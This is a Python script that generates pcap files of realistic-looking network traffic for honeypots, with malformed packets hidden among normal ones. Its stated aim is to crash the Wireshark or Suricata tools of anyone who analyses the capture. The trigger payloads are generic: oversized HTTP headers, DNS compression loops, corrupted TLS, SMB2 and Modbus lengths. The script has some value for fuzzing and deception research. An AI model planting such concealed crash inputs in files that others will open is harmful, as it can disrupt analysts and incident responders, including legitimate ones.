"""Generate honeypot traffic that embeds vulnerability triggers in normal-looking pcaps."""

from __future__ import annotations

import random
import struct
import time
from pathlib import Path
from dataclasses import dataclass

from rich.console import Console
from rich.progress import Progress


@dataclass
class HoneypotProfile:
    name: str
    description: str
    protocols: list[str]
    trigger_ratio: float  # fraction of packets that carry triggers


PROFILES = {
    "enterprise": HoneypotProfile(
        name="Enterprise Network",
        description="Realistic corporate LAN traffic with embedded parser triggers",
        protocols=["http", "dns", "tls", "smb2", "dcerpc", "kerberos"],
        trigger_ratio=0.05,
    ),
    "ics": HoneypotProfile(
        name="ICS/SCADA Network",
        description="Industrial control system traffic with Modbus/DNP3 triggers",
        protocols=["modbus", "dnp3", "coap", "mqtt", "http"],
        trigger_ratio=0.08,
    ),
    "isp": HoneypotProfile(
        name="ISP Edge",
        description="ISP backbone traffic with BGP/GTP triggers",
        protocols=["bgp", "gtp", "diameter", "dns", "http", "tls"],
        trigger_ratio=0.03,
    ),
    "iot": HoneypotProfile(
        name="IoT Network",
        description="IoT device traffic with CoAP/MQTT triggers",
        protocols=["coap", "mqtt", "http", "dns", "tls"],
        trigger_ratio=0.10,
    ),
}


class HoneypotTrafficGenerator:
    """Generate realistic network traffic with embedded vulnerability triggers.

    The idea: if an attacker uses Wireshark/Suricata to analyze captured traffic
    from a honeypot, the traffic itself can crash their tools. Offense as defense.
    """

    def __init__(self, profile: str = "enterprise"):
        if profile not in PROFILES:
            raise ValueError(f"Unknown profile: {profile}. Choose from: {list(PROFILES.keys())}")
        self.profile = PROFILES[profile]

    def generate(self, output_path: Path, duration_packets: int = 1000,
                 console: Console | None = None) -> Path:
        """Generate a honeypot pcap with embedded triggers."""
        packets: list[bytes] = []

        trigger_count = int(duration_packets * self.profile.trigger_ratio)
        normal_count = duration_packets - trigger_count

        trigger_positions = set(random.sample(range(duration_packets), trigger_count))

        ts = int(time.time())

        with Progress(console=console) as progress:
            task = progress.add_task(
                f"Generating {self.profile.name} traffic...",
                total=duration_packets,
            )

            for i in range(duration_packets):
                if i in trigger_positions:
                    proto = random.choice(self.profile.protocols)
                    pkt = self._make_trigger_packet(proto, ts + i)
                else:
                    proto = random.choice(self.profile.protocols)
                    pkt = self._make_normal_packet(proto, ts + i)

                packets.append(pkt)
                progress.advance(task)

        self._write_pcap(output_path, packets, ts)

        if console:
            console.print(
                f"\n[bold green]✓[/bold green] Generated {len(packets)} packets "
                f"({trigger_count} triggers hidden in {normal_count} normal packets)"
            )
            console.print(f"  Profile: {self.profile.name}")
            console.print(f"  Output: {output_path}")

        return output_path

    def _make_normal_packet(self, protocol: str, timestamp: int) -> bytes:
        """Generate a benign-looking packet for the given protocol."""
        src_ip = self._random_internal_ip()
        dst_ip = self._random_ip()
        src_port = random.randint(1024, 65535)

        port_map = {
            "http": 80, "tls": 443, "dns": 53, "smb2": 445,
            "dcerpc": 135, "kerberos": 88, "modbus": 502,
            "dnp3": 20000, "coap": 5683, "mqtt": 1883,
            "bgp": 179, "gtp": 2152, "diameter": 3868,
        }
        dst_port = port_map.get(protocol, 80)

        payload = self._normal_payload(protocol)
        return self._wrap_udp(src_ip, dst_ip, src_port, dst_port, payload)

    def _make_trigger_packet(self, protocol: str, timestamp: int) -> bytes:
        """Generate a packet that looks normal but triggers parser vulnerabilities."""
        src_ip = self._random_internal_ip()
        dst_ip = self._random_ip()
        src_port = random.randint(1024, 65535)

        port_map = {
            "http": 80, "tls": 443, "dns": 53, "smb2": 445,
            "dcerpc": 135, "kerberos": 88, "modbus": 502,
            "dnp3": 20000, "coap": 5683, "mqtt": 1883,
            "bgp": 179, "gtp": 2152, "diameter": 3868,
        }
        dst_port = port_map.get(protocol, 80)

        payload = self._trigger_payload(protocol)
        return self._wrap_udp(src_ip, dst_ip, src_port, dst_port, payload)

    def _normal_payload(self, protocol: str) -> bytes:
        """Generate a benign protocol payload."""
        generators = {
            "http": lambda: b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
            "dns": lambda: self._dns_query(b"example.com"),
            "tls": lambda: self._tls_client_hello(),
            "mqtt": lambda: b"\x10" + b"\x11" + b"\x00\x04MQTT\x04\x02\x00\x3c\x00\x05hello",
            "coap": lambda: b"\x40\x01\x00\x01\xbb.well-known\x04core",
            "modbus": lambda: b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0a",
            "smb2": lambda: b"\xfeSMB" + b"\x00" * 60,
            "dnp3": lambda: b"\x05\x64\x05\xc0\x01\x00\x00\x00" + b"\x00" * 10,
        }
        gen = generators.get(protocol, lambda: b"\x00" * random.randint(20, 100))
        return gen()

    def _trigger_payload(self, protocol: str) -> bytes:
        """Generate a payload that looks valid but triggers parser edge cases."""
        triggers = {
            "http": self._http_trigger,
            "dns": self._dns_trigger,
            "tls": self._tls_trigger,
            "mqtt": self._mqtt_trigger,
            "modbus": self._modbus_trigger,
            "smb2": self._smb_trigger,
            "dnp3": self._dnp3_trigger,
            "coap": self._coap_trigger,
        }
        gen = triggers.get(protocol, self._generic_trigger)
        return gen()

    def _http_trigger(self) -> bytes:
        """HTTP with oversized headers / chunked encoding abuse."""
        attacks = [
            b"GET / HTTP/1.1\r\nHost: " + b"A" * 65535 + b"\r\n\r\n",
            b"POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n"
            b"FFFFFFFE\r\n" + b"X" * 256 + b"\r\n0\r\n\r\n",
            b"GET / HTTP/1.1\r\n" + b"X-Pad: " + b"\x00" * 1024 + b"\r\n\r\n",
        ]
        return random.choice(attacks)

    def _dns_trigger(self) -> bytes:
        """DNS with compression loop / oversized labels."""
        attacks = [
            self._dns_query(b"\x3f" + b"A" * 63 + b"\x3f" + b"B" * 63 + b"\x00"),
            b"\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            b"\xc0\x0c",  # compression pointer loop
            self._dns_query(b"\xff" + b"X" * 255 + b"\x00"),
        ]
        return random.choice(attacks)

    def _tls_trigger(self) -> bytes:
        """TLS with malformed extensions / oversized fields."""
        hello = bytearray(self._tls_client_hello())
        if len(hello) > 10:
            hello[3:5] = struct.pack(">H", 0xFFFF)  # corrupt record length
        return bytes(hello)

    def _mqtt_trigger(self) -> bytes:
        """MQTT with oversized remaining length."""
        return b"\x10\xff\xff\xff\x7f" + b"\x00" * 128

    def _modbus_trigger(self) -> bytes:
        """Modbus with invalid function codes and oversized data."""
        return b"\x00\x01\x00\x00\xff\xff\x01\x90" + b"\x00" * 512

    def _smb_trigger(self) -> bytes:
        """SMB2 with corrupt structure size."""
        header = bytearray(b"\xfeSMB" + b"\x00" * 60)
        header[4:6] = struct.pack("<H", 0xFFFF)  # corrupt structure size
        return bytes(header) + b"\x00" * 256

    def _dnp3_trigger(self) -> bytes:
        """DNP3 with deep nesting / corrupt length."""
        return b"\x05\x64\xff\xc0\x01\x00\x00\x00" + b"\xff" * 300

    def _coap_trigger(self) -> bytes:
        """CoAP with max token length and many options."""
        return b"\x48\x01\x00\x01" + b"\xff" * 8 + b"\xd0" * 50

    def _generic_trigger(self) -> bytes:
        """Generic trigger with boundary values."""
        size = random.randint(100, 2000)
        data = bytearray(random.randbytes(size))
        for _ in range(5):
            pos = random.randint(0, len(data) - 4)
            data[pos:pos + 4] = struct.pack("<I", random.choice([
                0, 0xFFFFFFFF, 0x7FFFFFFF, 0x80000000, 0x41414141,
            ]))
        return bytes(data)

    def _dns_query(self, name: bytes) -> bytes:
        """Build a minimal DNS query."""
        txid = struct.pack(">H", random.randint(0, 0xFFFF))
        flags = b"\x01\x00"
        counts = b"\x00\x01\x00\x00\x00\x00\x00\x00"
        qtype = b"\x00\x01"
        qclass = b"\x00\x01"
        return txid + flags + counts + name + qtype + qclass

    def _tls_client_hello(self) -> bytes:
        """Build a minimal TLS ClientHello."""
        random_bytes = random.randbytes(32)
        hello = (
            b"\x03\x03"  # TLS 1.2
            + random_bytes  # client random
            + b"\x00"  # session id length
            + b"\x00\x02\x00\xff"  # cipher suites
            + b"\x01\x00"  # compression methods
        )
        handshake = b"\x01" + struct.pack(">I", len(hello))[1:] + hello
        record = b"\x16\x03\x01" + struct.pack(">H", len(handshake)) + handshake
        return record

    def _wrap_udp(self, src_ip: str, dst_ip: str,
                  src_port: int, dst_port: int, payload: bytes) -> bytes:
        """Wrap payload in UDP+IP+Ethernet."""
        if len(payload) > 65000:
            payload = payload[:65000]
        udp_len = 8 + len(payload)
        udp = struct.pack(">HHH", src_port, dst_port, udp_len) + b"\x00\x00" + payload

        ip_total = 20 + len(udp)
        ip_header = bytearray(20)
        ip_header[0] = 0x45  # version + IHL
        struct.pack_into(">H", ip_header, 2, ip_total)
        ip_header[8] = 64  # TTL
        ip_header[9] = 17  # UDP
        ip_parts = [int(x) for x in src_ip.split(".")]
        ip_header[12:16] = bytes(ip_parts)
        ip_parts = [int(x) for x in dst_ip.split(".")]
        ip_header[16:20] = bytes(ip_parts)

        checksum = self._ip_checksum(bytes(ip_header))
        struct.pack_into(">H", ip_header, 10, checksum)

        eth = b"\x00" * 6 + b"\x00" * 6 + b"\x08\x00"
        return eth + bytes(ip_header) + udp

    def _ip_checksum(self, header: bytes) -> int:
        s = 0
        for i in range(0, len(header), 2):
            s += (header[i] << 8) + (header[i + 1] if i + 1 < len(header) else 0)
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def _random_internal_ip(self) -> str:
        return f"10.{random.randint(0,255)}.{random.randint(1,254)}.{random.randint(1,254)}"

    def _random_ip(self) -> str:
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

    def _write_pcap(self, path: Path, packets: list[bytes], base_ts: int):
        """Write packets to a pcap file."""
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "wb") as f:
            # Global header
            f.write(struct.pack("<IHHiIII",
                                0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))
            for i, pkt in enumerate(packets):
                ts_sec = base_ts + i
                ts_usec = random.randint(0, 999999)
                f.write(struct.pack("<IIII", ts_sec, ts_usec, len(pkt), len(pkt)))
                f.write(pkt)
